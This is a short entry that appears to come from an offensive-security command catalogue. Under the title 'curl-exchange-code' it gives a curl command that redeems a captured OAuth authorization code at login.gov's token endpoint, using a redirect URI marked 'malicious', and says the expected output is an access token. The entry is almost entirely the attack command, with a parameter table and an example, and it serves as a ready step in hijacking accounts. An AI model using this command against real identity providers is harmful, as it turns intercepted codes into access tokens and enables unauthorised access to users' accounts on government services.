---
data: >-
  curl -X POST "https://idp.login.gov/oauth/token" -d
  "grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://agency.gov.example.com/malicious&client_id=CLIENT_ID&client_secret=SECRET"
  -v
tags:
  - token-exchange
  - http
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:19.944Z'
id: 17df680e-6697-48fe-bed9-94086d1d81a3
verified: false
validated: true
submitted: true
---
# curl-exchange-code

## Command

```bash
curl -X POST "https://idp.login.gov/oauth/token" -d "grant_type=authorization_code&code=CAPTURED_CODE&redirect_uri=https://agency.gov.example.com/malicious&client_id=CLIENT_ID&client_secret=SECRET" -v
```

## Description

Exchanges captured authorization code for access token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | POST data | Yes |
| `code` | Captured auth code | Yes |
| `client_secret` | If required | No |

## Examples

### Basic Usage

```bash
curl -X POST "https://idp.login.gov/oauth/token" -d "grant_type=authorization_code&code=ABC123&..." -v
```

## Expected Output

JSON with access_token.

## Related

- [[Related Procedure]]
